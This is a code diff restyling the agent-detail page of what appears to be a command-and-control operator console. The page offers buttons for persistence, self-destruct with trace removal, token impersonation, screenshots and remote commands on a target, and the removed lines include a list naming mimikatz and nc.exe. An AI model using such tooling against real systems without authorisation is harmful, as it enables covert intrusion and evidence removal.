-              <span className="text-[10px] font-bold text-slate-300">{agent.last_seen ? formatDistanceToNow(new Date(agent.last_seen)) : 'Never'} ago</span>
-            </div>
+        <div style={{ display: 'flex', alignItems: 'center', gap: 16 }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 11, color: 'var(--color-text-muted)' }}>
+            <span>Last seen:</span>
+            <span style={{ fontWeight: 600, color: 'var(--color-text)' }}>{agent.last_seen ? formatDistanceToNow(new Date(agent.last_seen), { addSuffix: true }) : 'Never'}</span>
           </div>
-          
-          <div className="h-6 w-px bg-slate-800" />
-
-          <button 
-            onClick={handleKillAgent}
-            className="px-4 py-2 rounded-lg bg-red-500/10 text-red-500 hover:bg-red-500 hover:text-white transition-all border border-red-500/20 font-bold text-[10px] uppercase tracking-wider flex items-center gap-2 group"
-          >
-            TERMINATE NODE <Trash2 className="w-3.5 h-3.5" />
+          <button onClick={handleKillAgent} className="btn btn-danger" style={{ fontSize: 11 }}>
+            <Trash2 size={13} /> Terminate
           </button>
         </div>
       </div>
 
-
-      {/* Main Content Area */}
-      <div className="flex-1 flex overflow-hidden">
-        {/* Left Sidebar: Asset Intelligence */}
+      {/* ── Main Layout ── */}
+      <div style={{ flex: 1, display: 'flex', overflow: 'hidden', minHeight: 0 }}>
+        {/* Left Sidebar */}
         {!sidebarCollapsed && (
-          <div className="w-80 border-r border-slate-800/50 flex flex-col bg-slate-900/10 overflow-y-auto scrollbar-thin transition-all">
-            <div className="p-6 space-y-6">
-              {/* System Specs */}
-              <div className="space-y-4">
-                <div className="flex items-center justify-between">
-                  <span className="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Endpoint Specifications</span>
-                  <ShieldCheck className="w-3.5 h-3.5 text-primary/50" />
-                </div>
-                
-                <div className="space-y-2">
-                  {[
-                  { label: 'OS Platform', value: agent.os, icon: Monitor },
-                  { label: 'Architecture', value: agent.arch, icon: Cpu },
-                  { label: 'Process ID', value: agent.pid, icon: ActivityIcon },
-                  { 
-                    label: 'Integrity', 
-                    value: <span className="text-emerald-500 font-bold tracking-tight">System/Root</span>,
-                    icon: ShieldCheck 
-                  },
+          <div style={{ width: 240, flexShrink: 0, borderRight: '1px solid var(--color-border)', background: 'var(--color-surface)', overflowY: 'auto', padding: 16, display: 'flex', flexDirection: 'column', gap: 20 }}>
+            {/* Specs */}
+            <div>
+              <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--color-text-dim)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>Endpoint Specs</div>
+              <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
+                {[
+                  { label: 'OS', value: agent.os, icon: Monitor },
+                  { label: 'Arch', value: agent.arch, icon: Cpu },
+                  { label: 'PID', value: agent.pid, icon: ActivityIcon },
+                  { label: 'IP', value: agent.ip_address || '0.0.0.0', icon: Wifi },
                 ].map((item, i) => (
-                    <div key={i} className="flex items-center justify-between p-3 rounded-xl bg-surface/30 border border-border group hover:border-primary/30 transition-all">
-                      <div className="flex items-center gap-3">
-                        <item.icon className="w-4 h-4 text-slate-500 group-hover:text-primary transition-colors" />
-                        <span className="text-[10px] font-bold text-slate-500 uppercase tracking-wider">{item.label}</span>
-                      </div>
-                      <span className="text-[11px] font-mono text-slate-300">{item.value}</span>
+                  <div key={i} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '6px 10px', borderRadius: 6, background: 'var(--color-surface-raised)', border: '1px solid var(--color-border-muted)' }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
+                      <item.icon size={12} style={{ color: 'var(--color-text-muted)' }} />
+                      <span style={{ fontSize: 11, color: 'var(--color-text-muted)' }}>{item.label}</span>
                     </div>
-                  ))}
-                </div>
-              </div>
-
-              {/* Operational Control */}
-              <div className="space-y-4 pt-4 border-t border-slate-800/50">
-                <span className="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Command Shortcuts</span>
-                <div className="grid grid-cols-2 gap-2">
-                    {[
-                      { label: 'Screenshot', icon: Monitor, type: 'screenshot' },
-                      { label: 'Shell Info', icon: TerminalIcon, type: 'system_info' },
-                      { label: 'Net Check', icon: Wifi, type: 'netstat_json' },
-                      { label: 'Process Sc', icon: Cpu, type: 'ps_json' },
-                      { label: 'Get Privs', icon: ShieldCheck, type: 'getprivs' },
-                      { label: 'Identity', icon: MousePointer2, type: 'revert_self' },
-                    ].map((action, i) => (
-                      <button
-                        key={i}
-                        onClick={() => handleQuickAction(action.type, {})}
-                        className="flex flex-col items-center justify-center gap-3 p-4 rounded-xl bg-slate-900/40 border border-slate-800/50 hover:border-primary/40 hover:bg-primary/5 transition-all group"
-                      >
-                        <action.icon className="w-5 h-5 text-slate-500 group-hover:text-primary transition-colors" />
-                        <span className="text-[10px] font-bold text-slate-500 group-hover:text-slate-300 uppercase tracking-wider">{action.label}</span>
-                      </button>
-                    ))}
-                </div>
-              </div>
-
-              {/* Advanced Operations */}
-              <div className="space-y-4 pt-4 border-t border-slate-800/50">
-                <span className="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Advanced Operations</span>
-                <div className="grid grid-cols-2 gap-2">
-                  <button
-                    onClick={() => handleQuickAction('persist', {})}
-                    className="flex items-center gap-3 p-3 rounded-xl bg-slate-900/40 border border-slate-800/50 hover:border-emerald-500/40 hover:bg-emerald-500/5 transition-all group"
-                  >
-                    <ShieldAlert className="w-4 h-4 text-slate-500 group-hover:text-emerald-500 transition-colors" />
-                    <span className="text-[10px] font-bold text-slate-500 group-hover:text-slate-300 uppercase tracking-wider">Persistence</span>
-                  </button>
-                  <button
-                    onClick={() => {
-                      if(confirm('WARNING: Self-destruct will remove the agent binary and all traces from the target system. Proceed?')) {
-                        handleQuickAction('self_destruct', {});
-                      }
-                    }}
-                    className="flex items-center gap-3 p-3 rounded-xl bg-slate-900/40 border border-slate-800/50 hover:border-red-500/40 hover:bg-red-500/5 transition-all group"
-                  >
-                    <Bomb className="w-4 h-4 text-slate-500 group-hover:text-red-500 transition-colors" />
-                    <span className="text-[10px] font-bold text-slate-500 group-hover:text-slate-300 uppercase tracking-wider">Self Destruct</span>
-                  </button>
-                </div>
-              </div>
-
-              {/* Mission Intelligence (Notes & Tags) */}
-              <div className="space-y-4 pt-4 border-t border-slate-800/50">
-                <span className="text-[11px] font-bold text-slate-500 uppercase tracking-wider">Operational Notes</span>
-                
-                <div className="space-y-3">
-                  {/* Notes */}
-                  <div className="relative group">
-                    <div className="absolute top-3 left-3 pointer-events-none">
-                      <FileText className="w-3.5 h-3.5 text-slate-600 group-focus-within:text-primary transition-colors" />
-                    </div>
-                    <textarea 
-                      placeholder="Enter endpoint notes..."
-                      defaultValue={(() => {
-                        try {
-                          return JSON.parse(agent.metadata || '{}').notes || '';
-                        } catch { return ''; }
-                      })()}
-                      onBlur={async (e) => {
-                        const notes = e.target.value;
-                        let metadata = {};
-                        try { 
-                          metadata = JSON.parse(agent.metadata || '{}'); 
-                        } catch {
-                          /* ignore parsing error */
-                        }
-                        if (metadata.notes === notes) return;
-                        metadata.notes = notes;
-                        await agentsApi.updateMetadata(id, metadata);
-                        addToast('Endpoint notes synchronized', 'success');
-                      }}
-                      className="w-full bg-slate-900/40 border border-slate-800/50 rounded-xl pl-10 pr-4 py-3 text-[11px] text-slate-300 outline-none focus:border-primary/30 min-h-[100px] resize-none font-sans"
-                    />
+                    <span style={{ fontSize: 11, fontFamily: 'var(--font-mono)', fontWeight: 600, color: 'var(--color-text-header)' }}>{item.value}</span>
                   </div>
-
-                  {/* Tags */}
-                  <div className="flex flex-wrap gap-2">
-                    {(() => {
-                      let tags = [];
-                      try { 
-                        tags = JSON.parse(agent.metadata || '{}').tags || []; 
-                      } catch { 
-                        /* ignore parsing error */
-                      }
-                      return (
-                        <>
-                          {tags.map((tag, i) => (
-                            <span key={i} className="px-2 py-0.5 rounded-lg bg-primary/10 border border-primary/20 text-[9px] font-black text-primary uppercase tracking-widest flex items-center gap-1.5">
-                              {tag}
-                              <button 
-                                onClick={async () => {
-                                  let metadata = {};
-                                  try { 
-                                    metadata = JSON.parse(agent.metadata || '{}'); 
-                                  } catch {
-                                    /* ignore parsing error */
-                                  }
-                                  metadata.tags = (metadata.tags || []).filter(t => t !== tag);
-                                  await agentsApi.updateMetadata(id, metadata);
-                                  addToast('Tag removed', 'info');
-                                  fetchDetails();
-                                }}
-                                className="hover:text-white transition-colors"
-                              >
-                                ×
-                              </button>
-                            </span>
-                          ))}
-                          <button 
-                            onClick={async () => {
-                              const tag = prompt('Enter new tag:');
-                              if (!tag) return;
-                              let metadata = {};
-                              try { 
-                                metadata = JSON.parse(agent.metadata || '{}'); 
-                              } catch {
-                                /* ignore parsing error */
-                              }
-                              metadata.tags = [...(metadata.tags || []), tag];
-                              await agentsApi.updateMetadata(id, metadata);
-                              addToast('Tag added', 'success');
-                              fetchDetails();
-                            }}
-                            className="px-2 py-0.5 rounded-lg border border-slate-800 text-[9px] font-bold text-slate-500 uppercase tracking-widest hover:border-slate-600 hover:text-slate-300 transition-all"
-                          >
-                            + Add Tag
-                          </button>
-                        </>
-                      );
-                    })()}
-                  </div>
-                </div>
+                ))}
               </div>
+            </div>
+
+            {/* Quick Commands */}
+            <div>
+              <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--color-text-dim)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>Quick Shortcuts</div>
+              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 6 }}>
+                {[
+                  { label: 'Processes', icon: Cpu, type: 'ps_json' },
+                  { label: 'Network', icon: Wifi, type: 'netstat_json' },
+                  { label: 'Files', icon: Folder, type: 'ls_json' },
+                  { label: 'Screenshot', icon: Monitor, type: 'screenshot' },
+                  { label: 'Privileges', icon: ShieldCheck, type: 'getprivs' },
+                  { label: 'Revert', icon: MousePointer2, type: 'revert_self' },
+                ].map((action, i) => (
+                  <button key={i} onClick={() => handleQuickAction(action.type, {})}
+                    className="btn btn-secondary" style={{ padding: '8px 6px', flexDirection: 'column', gap: 4, fontSize: 10, textAlign: 'center' }}>
+                    <action.icon size={14} style={{ color: 'var(--color-primary)' }} />
+                    <span>{action.label}</span>
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            {/* Danger Actions */}
+            <div>
+              <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--color-text-dim)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>Dangerous Operations</div>
+              <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
+                <button onClick={() => handleQuickAction('persist', {})} className="btn btn-secondary" style={{ justifyContent: 'flex-start' }}>
+                  <ShieldAlert size={13} style={{ color: 'var(--color-warning)' }} /> Persistence
+                </button>
+                <button onClick={() => { if (confirm('Remove agent binary from target?')) handleQuickAction('self_destruct', {}); }} className="btn btn-danger" style={{ justifyContent: 'flex-start' }}>
+                  <Bomb size={13} /> Self Destruct
+                </button>
+              </div>
+            </div>
+
+            {/* Notes */}
+            <div>
+              <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--color-text-dim)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>Notes</div>
+              <textarea
+                placeholder="Add operator notes..."
+                defaultValue={(() => { try { return JSON.parse(agent.metadata || '{}').notes || ''; } catch { return ''; } })()}
+                onBlur={async (e) => {
+                  const notes = e.target.value;
+                  let metadata = {};
+                  try { metadata = JSON.parse(agent.metadata || '{}'); } catch {}
+                  if (metadata.notes === notes) return;
+                  metadata.notes = notes;
+                  await agentsApi.updateMetadata(id, metadata);
+                  addToast('Notes saved', 'success');
+                }}
+                className="input"
+                style={{ minHeight: 80, resize: 'none', fontSize: 11 }}
+              />
             </div>
           </div>
         )}
 
-        {/* Center Panel: Content & Console */}
-        <div className="flex-1 flex flex-col min-w-0 bg-black/20">
-          <div className="flex-1 flex flex-col overflow-hidden">
-              {/* Tabs Navigation */}
-              <div className="shrink-0 flex border-b border-slate-800/50 px-4 bg-slate-900/20">
-                {[
-                  { id: 'console', label: 'Terminal', icon: TerminalIcon },
-                  { id: 'processes', label: 'Processes', icon: Cpu },
-                  { id: 'network', label: 'Network', icon: Globe },
-                  { id: 'files', label: 'Files', icon: Folder },
-                  { id: 'bof', label: 'BOF Runner', icon: Zap },
-                ].map((tab) => (
-                  <button
-                    key={tab.id}
-                    onClick={() => setActiveTab(tab.id)}
-                    className={`flex items-center gap-2 px-6 py-4 text-[10px] font-black uppercase tracking-widest transition-all relative ${
-                      activeTab === tab.id ? 'text-primary' : 'text-slate-500 hover:text-slate-300'
-                    }`}
-                  >
-                    <tab.icon className="w-3.5 h-3.5" />
-                    {tab.label}
-                    {activeTab === tab.id && (
-                      <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-primary shadow-[0_0_8px_var(--color-primary)]" />
-                    )}
-                  </button>
-                ))}
-              </div>
+        {/* Center Panel */}
+        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minHeight: 0, background: 'var(--color-background)' }}>
+          {/* Tabs header */}
+          <div style={{ display: 'flex', borderBottom: '1px solid var(--color-border)', background: 'var(--color-surface)', padding: '0 16px' }}>
+            {[
+              { id: 'console', label: 'Terminal', icon: TerminalIcon },
+              { id: 'processes', label: 'Processes', icon: Cpu },
+              { id: 'network', label: 'Network', icon: Globe },
+              { id: 'files', label: 'Files', icon: Folder },
+              { id: 'bof', label: 'BOF Runner', icon: Zap },
+            ].map(tab => (
+              <button key={tab.id} onClick={() => setActiveTab(tab.id)}
+                style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '12px 16px', background: 'none', border: 'none', borderBottom: activeTab === tab.id ? '2px solid var(--color-primary)' : '2px solid transparent', color: activeTab === tab.id ? 'var(--color-primary)' : 'var(--color-text-muted)', fontSize: 12, fontWeight: 600, cursor: 'pointer', fontFamily: 'var(--font-sans)', transition: 'color 0.15s' }}>
+                <tab.icon size={14} />
+                {tab.label}
+              </button>
+            ))}
+          </div>
 
+          {/* ── Console Tab ── */}
           {activeTab === 'console' && (
-            <div className="flex-1 flex flex-col overflow-hidden relative">
-              <div className="flex-1 overflow-y-auto p-8 font-mono scrollbar-thin flex flex-col gap-8">
+            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minHeight: 0, position: 'relative' }}>
+              <div className="scroll-area" style={{ flex: 1, padding: 20, display: 'flex', flexDirection: 'column', gap: 16 }}>
                 {(() => {
                   const sortedResults = [...results].sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
                   let allItems = [...sortedResults, ...pendingTasks].sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
-                  
-                  if (clearedAt) {
-                    // Hide everything up to the recorded clear point
-                    allItems = allItems.filter(item => {
-                      return new Date(item.created_at).getTime() > new Date(clearedAt).getTime();
-                    });
+                  if (clearedAt) allItems = allItems.filter(item => new Date(item.created_at).getTime() > new Date(clearedAt).getTime());
+
+                  if (allItems.length === 0) {
+                    return <div className="dash-empty"><p>No console history. Type 'help' or run a command.</p></div>;
                   }
 
                   return allItems.map((res) => {
                     const isPending = !res.status || res.status === 'pending';
                     const payload = typeof res.task_payload === 'string' ? JSON.parse(res.task_payload) : (res.task_payload || {});
-                    
                     return (
-                      <div key={res.id} className="group animate-in fade-in slide-in-from-left-4 duration-500">
-                        <div className="flex items-center gap-3 mb-3">
-                          <span className="text-[10px] font-bold text-slate-600 uppercase tracking-[0.2em]">
-                            [{format(new Date(res.created_at), 'HH:mm:ss')}]
-                          </span>
-                          <span className={`text-[10px] font-black uppercase tracking-widest px-2 py-0.5 rounded ${
-                            isPending ? 'bg-primary/10 text-primary animate-pulse' :
-                            res.status === 'success' ? 'bg-success/10 text-success' :
-                            'bg-error/10 text-error'
-                          }`}>
-                            {res.task_type.replace('_json', '')}
-                          </span>
-                          {isPending ? (
-                            <Loader2 className="w-3 h-3 animate-spin text-primary" />
-                          ) : res.status === 'success' ? (
-                            <CheckCircle2 className="w-3 h-3 text-success/50" />
-                          ) : (
-                            <AlertCircle className="w-3 h-3 text-error/50" />
-                          )}
+                      <div key={res.id} style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
+                        <div style={{ display: 'flex', alignItems: 'center', gap: 8, fontSize: 11 }}>
+                          <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-text-dim)' }}>[{format(new Date(res.created_at), 'HH:mm:ss')}]</span>
+                          <span className="type-badge">{(res.task_type || 'task').replace('_json', '')}</span>
+                          {isPending ? <Loader2 size={12} style={{ color: 'var(--color-primary)', animation: 'spin 1s linear infinite' }} />
+                            : res.status === 'success' ? <CheckCircle2 size={12} style={{ color: 'var(--color-success)' }} />
+                            : <AlertCircle size={12} style={{ color: 'var(--color-error)' }} />}
                         </div>
-                        <div className="pl-4 border-l border-border/50 group-hover:border-primary/30 transition-colors">
-                          <div className="text-white/80 mb-2 flex items-center gap-2 font-mono text-xs">
-                            <span className="text-primary/60 font-bold">$</span>
-                            <span>{payload.command || res.task_type}</span>
-                            {payload.path && <span className="text-slate-600 ml-2">[{payload.path}]</span>}
+                        <div style={{ paddingLeft: 12, borderLeft: '2px solid var(--color-border)' }}>
+                          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 12, color: 'var(--color-text-header)', marginBottom: 6 }}>
+                            <span style={{ color: 'var(--color-primary)', marginRight: 6 }}>$</span>
+                            {payload.command || res.task_type}
                           </div>
-                          {!isPending && (
-                            <div className="bg-black/25 rounded-lg p-3 border border-white/5 shadow-inner">
-                              {renderOutput(res)}
-                            </div>
-                          )}
+                          {!isPending && renderOutput(res)}
                         </div>
                       </div>
                     );
@@ -1058,168 +584,49 @@ const AgentDetailPage = () => {
                 <div ref={resultEndRef} />
               </div>
 
-              {!autoScroll && (
-                <button 
-                  onClick={() => { setAutoScroll(true); resultEndRef.current?.scrollIntoView({ behavior: 'smooth' }); }}
-                  className="absolute bottom-28 right-8 p-4 rounded-2xl bg-primary text-white shadow-2xl shadow-primary/40 animate-in zoom-in-50 duration-300 hover:scale-110 active:scale-95 transition-all z-20"
-                >
-                  <ArrowDown className="w-5 h-5" />
-                </button>
-              )}
-
-              <form onSubmit={handleCommand} className="p-4 bg-surface/30 border-t border-border shrink-0">
-                <div className="relative flex items-center">
-                  <div className="absolute left-4 flex items-center pointer-events-none select-none">
-                    <span className="text-primary font-bold text-base">$</span>
-                  </div>
-                  <input
-                    type="text"
-                    value={command}
-                    onChange={(e) => setCommand(e.target.value)}
-                    onKeyDown={handleKeyDown}
-                    placeholder="Enter system command..."
-                    className="w-full bg-black/60 border border-border rounded-lg pl-10 pr-28 py-3 text-white outline-none focus:border-primary/50 transition-all font-mono text-[13px] placeholder:text-slate-700 shadow-inner"
-                    disabled={executing}
-                  />
-                  <div className="absolute right-1.5">
-                    <button
-                      type="submit"
-                      disabled={executing || !command.trim()}
-                      className="px-5 py-1.5 bg-primary text-white rounded-md font-bold uppercase text-[10px] tracking-wider disabled:opacity-30 transition-all flex items-center gap-2 shadow-lg shadow-primary/20"
-                    >
-                      {executing ? <Loader2 className="w-3 h-3 animate-spin" /> : <Send className="w-3 h-3" />}
-                      RUN
-                    </button>
-                  </div>
+              {/* Prompt bar */}
+              <form onSubmit={handleCommand} style={{ padding: 12, borderTop: '1px solid var(--color-border)', background: 'var(--color-surface)', display: 'flex', gap: 8 }}>
+                <div style={{ flex: 1, position: 'relative', display: 'flex', alignItems: 'center' }}>
+                  <span style={{ position: 'absolute', left: 12, color: 'var(--color-primary)', fontFamily: 'var(--font-mono)', fontWeight: 700 }}>$</span>
+                  <input type="text" value={command} onChange={e => setCommand(e.target.value)} onKeyDown={handleKeyDown}
+                    placeholder="Enter command or 'help'..." className="input" style={{ paddingLeft: 28, fontFamily: 'var(--font-mono)' }} disabled={executing} />
                 </div>
+                <button type="submit" disabled={executing || !command.trim()} className="btn btn-primary">
+                  {executing ? <Loader2 size={14} style={{ animation: 'spin 1s linear infinite' }} /> : <Send size={14} />} Send
+                </button>
               </form>
             </div>
           )}
 
+          {/* ── Processes Tab ── */}
           {activeTab === 'processes' && (
-            <div className="card flex-1 flex flex-col overflow-hidden relative border-slate-800/50">
-              <div className="px-4 py-2 border-b border-slate-800 flex items-center justify-between bg-slate-900/40 shrink-0 gap-4">
-                <div className="flex items-center gap-3">
-                  <Cpu className="w-4 h-4 text-primary" />
-                  <div>
-                    <span className="text-[11px] font-bold text-white uppercase tracking-wider block">Endpoint Processes</span>
-                    <span className="text-[10px] text-slate-500 font-medium">
-                      {psList ? `${psList.filter(p => p.name.toLowerCase().includes(psSearchQuery.toLowerCase())).length} total processes active` : 'Scanning infrastructure...'}
-                    </span>
-                  </div>
-                </div>
-
-                <div className="flex items-center gap-6">
-                  <button
-                    onClick={() => setIsMonitoring(!isMonitoring)}
-                    className={`px-3 py-1.5 rounded-lg border flex items-center gap-3 transition-all ${
-                      isMonitoring 
-                        ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' 
-                        : 'bg-slate-900 border-slate-800 text-slate-500 grayscale'
-                    }`}
-                  >
-                    <div className={`w-2 h-2 rounded-full ${isMonitoring ? 'bg-emerald-500 animate-pulse' : 'bg-slate-700'}`} />
-                    <span className="text-[9px] font-bold uppercase tracking-widest">Live Monitor</span>
-                  </button>
-
-                  <div className="flex-1 max-w-sm relative">
-                    <input 
-                      type="text" 
-                      placeholder="Search binaries..."
-                      value={psSearchQuery}
-                      onChange={(e) => setPsSearchQuery(e.target.value)}
-                      className="w-full bg-black/40 border border-slate-800 rounded-lg pl-9 pr-4 py-1.5 text-xs text-white outline-none focus:border-primary/50 transition-all"
-                    />
-                    <RefreshCw className={`absolute left-3 top-2 w-3.5 h-3.5 text-slate-600 ${pendingTasks.some(t => t.task_type === 'ps_json') ? 'animate-spin' : ''}`} />
-                  </div>
-                </div>
-
-                <button 
-                  onClick={() => handleQuickAction('ps_json', {})}
-                  disabled={pendingTasks.some(t => t.task_type === 'ps_json')}
-                  className="px-3 py-1.5 rounded-lg bg-primary text-white text-[10px] font-bold uppercase tracking-wider hover:bg-primary-hover transition-all flex items-center gap-2"
-                >
-                  <RefreshCw className={`w-3 h-3 ${pendingTasks.some(t => t.task_type === 'ps_json') ? 'animate-spin' : ''}`} />
-                  {pendingTasks.some(t => t.task_type === 'ps_json') ? 'Scanning' : 'Refresh'}
+            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minHeight: 0, padding: 20 }}>
+              <div style={{ display: 'flex', gap: 10, marginBottom: 12, alignItems: 'center' }}>
+                <input type="text" placeholder="Search processes..." value={psSearchQuery} onChange={e => setPsSearchQuery(e.target.value)} className="input" style={{ flex: 1 }} />
+                <button onClick={() => handleQuickAction('ps_json', {})} className="btn btn-primary">
+                  <RefreshCw size={14} /> Refresh Processes
                 </button>
               </div>
-              
-              <div className="flex-1 overflow-y-auto scrollbar-thin">
-                <table className="w-full text-left text-[11px] border-collapse">
-                  <thead className="bg-slate-900/80 text-slate-500 sticky top-0 z-10 backdrop-blur-md">
-                    <tr>
-                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-20">PID</th>
-                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider">Process</th>
-                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-24">PPID</th>
-                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider w-24">Threads</th>
-                      <th className="px-5 py-2.5 border-b border-slate-800 font-bold uppercase tracking-wider text-right w-24">Actions</th>
-                    </tr>
+              <div className="card scroll-area" style={{ flex: 1, minHeight: 0 }}>
+                <table className="dash-table">
+                  <thead>
+                    <tr><th>PID</th><th>Process</th><th>PPID</th><th>Threads</th><th>Actions</th></tr>
                   </thead>
-                  <tbody className="divide-y divide-slate-800/50">
-                    {getLatestPsResult() ? (
-                      getLatestPsResult()
-                        .filter(p => p.name.toLowerCase().includes(psSearchQuery.toLowerCase()))
-                        .sort((a, b) => a.pid - b.pid)
-                        .map((proc) => {
-                          const isSelf = Number(proc.pid) === Number(agent.pid);
-                          const suspiciousBinaries = ['cmd.exe', 'powershell.exe', 'pwsh.exe', 'mimikatz.exe', 'wireshark.exe', 'nc.exe', 'nmap.exe', 'schtasks.exe', 'reg.exe', 'wmic.exe'];
-                          const isSuspicious = suspiciousBinaries.some(b => proc.name.toLowerCase().includes(b));
-                          const isNew = highlightedPids.has(proc.pid);
-                          
-                          return (
-
-
-                            <tr key={proc.pid} className={`hover:bg-white/5 transition-colors group ${isSelf ? 'bg-primary/5' : isSuspicious ? 'bg-red-500/5' : ''} ${isNew ? 'bg-emerald-500/5 border-l-2 border-emerald-500' : ''}`}>
-                              <td className={`px-5 py-2.5 font-mono font-bold ${isSelf ? 'text-primary' : isSuspicious ? 'text-red-400' : 'text-slate-500'}`}>
-                                {proc.pid}
-                              </td>
-                              <td className="px-5 py-2.5">
-                                <div className="flex items-center gap-2">
-                                  <span className={`font-semibold ${isSelf ? 'text-white' : isSuspicious ? 'text-red-200' : 'text-slate-200'}`}>{proc.name}</span>
-                                  {isSelf && (
-                                    <span className="px-1.5 py-0.5 rounded bg-primary/20 text-primary text-[8px] font-black uppercase tracking-widest border border-primary/20">Self</span>
-                                  )}
-                                  {isSuspicious && (
-                                    <span className="px-1.5 py-0.5 rounded bg-red-500/20 text-red-500 text-[8px] font-black uppercase tracking-widest border border-red-500/20 flex items-center gap-1">
-                                      <ShieldAlert className="w-2 h-2" /> High Risk
-                                    </span>
-                                  )}
-                                </div>
-                              </td>
-                              <td className="px-5 py-2.5 font-mono text-slate-500">{proc.ppid || '-'}</td>
-                              <td className="px-5 py-2.5 font-mono text-slate-500">{proc.threads || '-'}</td>
-                              <td className="px-5 py-2.5 text-right">
-                                <button 
-                                  onClick={() => {
-                                    if(confirm(`Kill process ${proc.name} (${proc.pid})?`)) {
-                                      handleQuickAction('kill', { pid: proc.pid });
-                                    }
-                                  }}
-                                  className="p-1.5 rounded-lg hover:bg-red-500/10 text-slate-600 hover:text-red-400 transition-all opacity-0 group-hover:opacity-100"
-                                  title="Kill process"
-                                >
-                                  <Trash2 className="w-3.5 h-3.5" />
-                                </button>
-                                <button 
-                                  onClick={() => {
-                                    handleQuickAction('impersonate', { pid: proc.pid });
-                                  }}
-                                  className="p-1.5 rounded-lg hover:bg-primary/10 text-slate-600 hover:text-primary transition-all opacity-0 group-hover:opacity-100"
-                                  title="Impersonate"
-                                >
-                                  <MousePointer2 className="w-3.5 h-3.5" />
-                                </button>
-                              </td>
-                            </tr>
-                          );
-                        })
+                  <tbody>
+                    {psList ? (
+                      psList.filter(p => p.name?.toLowerCase().includes(psSearchQuery.toLowerCase())).map(proc => (
+                        <tr key={proc.pid}>
+                          <td style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-primary)', fontWeight: 600 }}>{proc.pid}</td>
+                          <td style={{ fontWeight: 600, color: 'var(--color-text-header)' }}>{proc.name}</td>
+                          <td style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-text-muted)' }}>{proc.ppid || '—'}</td>
+                          <td style={{ fontFamily: 'var(--font-mono)', color: 'var(--color-text-muted)' }}>{proc.threads || '—'}</td>
+                          <td>
+                            <button onClick={() => handleQuickAction('kill', { pid: proc.pid })} className="btn btn-danger" style={{ padding: '3px 8px', fontSize: 10 }}>Kill</button>
+                          </td>
+                        </tr>
+                      ))
                     ) : (
-                      <tr>
-                        <td colSpan="4" className="py-20 text-center">
-                          <Loader2 className="w-6 h-6 text-primary animate-spin mx-auto mb-4" />
-                          <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest">Awaiting Process Stream...</p>
-                        </td>
-                      </tr>
+                      <tr><td colSpan={5} style={{ textAlign: 'center', padding: 40, color: 'var(--color-text-dim)' }}>No process data available. Click Refresh Processes.</td></tr>
                     )}
                   </tbody>
                 </table>
@@ -1227,322 +634,118 @@ const AgentDetailPage = () => {
             </div>
           )}
 
-          {activeTab === 'files' && (
-            <div className="card flex-1 flex flex-col overflow-hidden relative border-slate-800/50">
-              <div className="px-4 py-2 border-b border-slate-800 flex items-center justify-between bg-slate-900/40 shrink-0 gap-4">
-                <div className="flex items-center gap-3">
-                  <div className="p-1.5 bg-primary/10 rounded-lg border border-primary/20">
-                    <Folder className="w-3.5 h-3.5 text-primary" />
-                  </div>
-                  <div>
-                    <span className="text-xs font-bold text-white block leading-none">File Explorer</span>
-                    <span className="text-[9px] text-slate-500 font-bold uppercase tracking-wider">
-                      {getLatestLsResult() ? `${getLatestLsResult().files.filter(f => f.name.toLowerCase().includes(fileSearchQuery.toLowerCase())).length} Items` : 'Navigating...'}
-                    </span>
-                  </div>
-                </div>
-
-                <div className="flex-1 max-w-sm relative">
-                  <input 
-                    type="text" 
-                    placeholder="Search current directory..."
-                    value={fileSearchQuery}
-                    onChange={(e) => setFileSearchQuery(e.target.value)}
-                    className="w-full bg-black/40 border border-slate-800 rounded-lg pl-9 pr-4 py-1.5 text-xs text-white outline-none focus:border-primary/50 transition-all"
-                  />
-                  <RefreshCw className={`absolute left-3 top-2 w-3.5 h-3.5 text-slate-600 ${pendingTasks.some(t => t.task_type === 'ls') ? 'animate-spin' : ''}`} />
-                </div>
-
-                <div className="flex gap-2">
-                  <button 
-                    onClick={() => handleQuickAction('ls', { path: getLatestLsResult()?.path || '.' })}
-                    disabled={pendingTasks.some(t => t.task_type === 'ls')}
-                    className="px-2.5 py-1.5 rounded-lg bg-slate-900 border border-slate-800 hover:bg-slate-800 text-slate-400 text-[9px] font-bold uppercase tracking-wider transition-all flex items-center gap-2"
-                  >
